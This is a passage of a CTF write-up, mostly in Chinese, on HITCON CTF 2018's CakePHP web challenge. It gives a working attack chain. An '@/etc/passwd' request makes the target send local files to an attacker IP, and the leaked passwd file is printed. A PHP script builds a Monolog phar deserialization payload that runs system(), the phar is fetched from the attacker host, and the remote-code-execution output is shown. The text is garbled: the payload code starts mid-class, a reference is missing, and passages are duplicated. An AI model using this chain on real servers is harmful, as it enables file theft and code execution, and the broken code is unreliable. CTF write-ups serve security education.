         *
         * @param string|array|null $body The body for the request. Leave null for get
         * @return mixed Either $this or the body value.
         */
        public function body($body = null)
        {
            if ($body === null) {
                $body = $this->getBody();
                return $body ? $body->__toString() : '';
            }
            if (is_array($body)) {
                $formData = new FormData();
                $formData->addMany($body);
                $this->header('Content-Type', $formData->contentType());
                $body = (string)$formData;
            }
            $stream = new Stream('php://memory', 'rw');
            $stream->write($body);
            $this->stream = $stream;
            return $this;
        }
在`body($body)`函数中，如果`$body`是数组，则使用函数`Cake\Http\FormData`处理，并调用`addMany(array
$array)`。让我们看看`vendor/cakephp/cakephp/src/Http/Client/FormData.php`这个函数中发生了什么。
    /**
         * Add a new part to the data.
         *
         * The value for a part can be a string, array, int,
         * float, filehandle, or object implementing __toString()
         *
         * If the $value is an array, multiple parts will be added.
         * Files will be read from their current position and saved in memory.
         *
         * @param string|\Cake\Http\Client\FormData $name The name of the part to add,
         *   or the part data object.
         * @param mixed $value The value for the part.
         * @return $this
         */
        public function add($name, $value = null)
        {
            if (is_array($value)) {
                $this->addRecursive($name, $value);
            } elseif (is_resource($value)) {
                $this->addFile($name, $value);
            } elseif (is_string($value) && strlen($value) && $value[0] === '@') {
                trigger_error(
                    'Using the @ syntax for file uploads is not safe and is deprecated. ' .
                    'Instead you should use file handles.',
                    E_USER_DEPRECATED
                );
                $this->addFile($name, $value);
            } elseif ($name instanceof FormDataPart && $value === null) {
                $this->_hasComplexPart = true;
                $this->_parts[] = $name;
            } else {
                $this->_parts[] = $this->newPart($name, $value);
            }
            return $this;
        }
        /**
         * Add multiple parts at once.
         *
         * Iterates the parameter and adds all the key/values.
         *
         * @param array $data Array of data to add.
         * @return $this
         */
        public function addMany(array $data)
        {
            foreach ($data as $name => $value) {
                $this->add($name, $value);
            }
            return $this;
        }
        /**
         * Add either a file reference (string starting with @)
         * or a file handle.
         *
         * @param string $name The name to use.
         * @param mixed $value Either a string filename, or a filehandle.
         * @return \Cake\Http\Client\FormDataPart
         */
        public function addFile($name, $value)
        {
            $this->_hasFile = true;
            $filename = false;
            $contentType = 'application/octet-stream';
            if (is_resource($value)) {
                $content = stream_get_contents($value);
                if (stream_is_local($value)) {
                    $finfo = new finfo(FILEINFO_MIME);
                    $metadata = stream_get_meta_data($value);
                    $contentType = $finfo->file($metadata['uri']);
                    $filename = basename($metadata['uri']);
                }
            } else {
                $finfo = new finfo(FILEINFO_MIME);
                $value = substr($value, 1);
                $filename = basename($value);
                $content = file_get_contents($value);
                $contentType = $finfo->file($value);
            }
            $part = $this->newPart($name, $content);
            $part->type($contentType);
            if ($filename) {
                $part->filename($filename);
            }
            $this->add($part);
            return $part;
        }
`addMany(array $data)`函数的运行将迭代数组，然后遍历调用 `add($name, $value)`每个项目。在`add($name,
$value)`函数中，如果`$value`是`@`的字符串·，那么`addFile($name, $value)`将被调用。
在`addFile($name, $value)`函数里，因为`$value`是一个字符串，运行`$value = substr($value,
1);`并且`$content =
file_get_contents($value);`将被执行。有了这个，那么`$value`被`getQuery('data')`操作给污染了，我们就可以控制`file_get_contents`的参数了！
#### Local File Disclosure本地文件泄露
为了测试这个点，我们可以尝试进行本地文件泄露(Local File
Disclosure)。创建的“Request”数据将`Cake\Http\Client\Adapter\Stream`里的`fopen`直接发送到目标URL
，因此我们可以尝试将一个文件发送到我们的IP。
以下是一个将`/etc/passwd`内容发送到我们的IP的请求。
    POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/passwd
在我们的IP，我们将从目标服务器获得/`etc/passwd`内容！
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    lxd:x:105:65534::/var/lib/lxd/:/bin/false
    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
    sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
    orange:x:1001:1001:,,,:/home/orange:/bin/bash
我们还可以看到Apache配置使用`000-default.conf`和web目录`/var/www/html`。
    POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/apache2/sites-enabled/000-default.conf
        ...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ...
尝试从本地文件泄露中获取flag是不对的。因此，我们必须`RCE`。
#### Remote Code Execution RCE
The strategies that can be done are:
  1. Create a payload to do PHP Object Injection from the available Classes.
  2. Place the PHP Object Injection payload in a phar file, for example `exploit.phar` in our IP.
  3. Download `http://IP/exploit.phar` from the web application so the cache will be stored in `/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache`
  4. Do POST request with data query to open `phar://` stream wrapper so unserialization will occurs.
For gadgets, here we will try to use `Monolog` with references from
.
The following is the code to make the payload `exploit.phar` which will
execute `system ('ls -alt')`.  
通过使用Web应用程序中的功能特定，我们可以保存URL请求响应的正文内容到`/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(URL)/body.cache`。
可以做的策略是：
  * 创建payload来从可用的类中执行PHP对象注入。
  * 将PHP Object Injection的payload放在phar文件中，例如exploit.phar在我们的IP中。
  * 从Web应用程序`http://IP/exploit.phar`来下载，以便缓存在`/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache`
  * 使用数据查询执行POST请求以打开`phar://`流包装器，以便进行反序列化。
对于小工具，我们将尝试使用
以下是生成exploit.phar将执行的有效负载的代码system ('ls -alt')。
    socket = $x;
            }
        }
        class BufferHandler
        {
            protected $handler;
            protected $bufferSize = -1;
            protected $buffer;
            # ($record['level'] level) == false
            protected $level = null;
            protected $initialized = true;
            # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
            protected $bufferLimit = -1;
            protected $processors;
            function __construct($methods, $command)
            {
                $this->processors = $methods;
                $this->buffer = [$command];
                $this->handler = clone $this;
            }
        }
    }
    namespace{
        $cmd = "ls -alt";
        $obj = new \Monolog\Handler\SyslogUdpHandler(
            new \Monolog\Handler\BufferHandler(
                ['current', 'system'],
                [$cmd, 'level' => null]
            )
        );
        $phar = new Phar('exploit.phar');
        $phar->startBuffering();
        $phar->addFromString('test', 'test');
        $phar->setStub('');
        $phar->setMetadata($obj);
        $phar->stopBuffering();
    }
首先，尝试从Web应用程序访问`exploit.phar`。
    GET http://13.230.134.135/?url=http://IP/exploit.phar
然后，执行POST请求来打开`phar://`具有`exploit.phar`缓存位置的流作为路径。
    POST http://13.230.134.135/?url=http://IP&data[test]=@phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache
然后RCE成功完成！
    total 104
    drwxr-xr-x  26 root root  1000 Oct 21 11:08 run
    drwxrwxrwt   2 root root  4096 Oct 21 06:25 tmp
    -rwsr-sr-x   1 root root  8568 Oct 18 19:53 read_flag
    drwxr-xr-x  23 root root  4096 Oct 18 19:53 .
    drwxr-xr-x  23 root root  4096 Oct 18 19:53 ..
    drwx------   5 root root  4096 Oct 18 17:12 root
    drwxr-xr-x  90 root root  4096 Oct 18 11:23 etc
    dr-xr-xr-x  13 root root     0 Oct 16 07:57 sys
    -r--------   1 root root    54 Oct 15 19:49 flag
    drwxr-xr-x   4 root root  4096 Oct 15 19:41 home
    drwxr-xr-x   3 root root  4096 Oct  9 06:07 boot
    lrwxrwxrwx   1 root root    31 Oct  9 06:07 initrd.img -> boot/initrd.img-4.15.0-1023-aws
    lrwxrwxrwx   1 root root    28 Oct  9 06:07 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
    drwxr-xr-x   2 root root  4096 Oct  9 06:07 sbin
    lrwxrwxrwx   1 root root    14 Oct  8 17:14 www -> /var/www/html/
    drwxr-xr-x  14 root root  4096 Oct  8 17:13 var
    drwxr-xr-x   5 root root  4096 Oct  8 17:06 snap
    drwxr-xr-x  15 root root  2980 Oct  8 17:06 dev
    dr-xr-xr-x 136 root root     0 Oct  8 17:06 proc
    lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
    lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
    drwxr-xr-x  20 root root  4096 Sep 12 16:16 lib
    drwx------   2 root root 16384 Sep 12 16:10 lost+found
    drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
    drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
    drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
    drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
我们无法读取`/flag`文件，因为它只能被`root`读取。看来我们需要通过执行`/read_flagsetuid`以二进制来读取它。由于`tty`设定，我们可以执行反向shell并生成它。这样，`tty`不需要执行`system('/
get_flag')`,只通过修改先前的payload执行将给我们flag。
`Flag: **hitcon{smart_implementation_of_CURLOPT_SAFE_UPLOAD>
  * 
HITCON CTF 2018 Web 另一个题的wirteup的翻译：[One Line
PHP](https://xz.aliyun.com/t/3009 "One Line PHP")在先知。
# re
HITCON CTF 2018 Web 另一个题的wirteup：[One Line PHP](https://xz.aliyun.com/t/3009
"One Line PHP")在先知。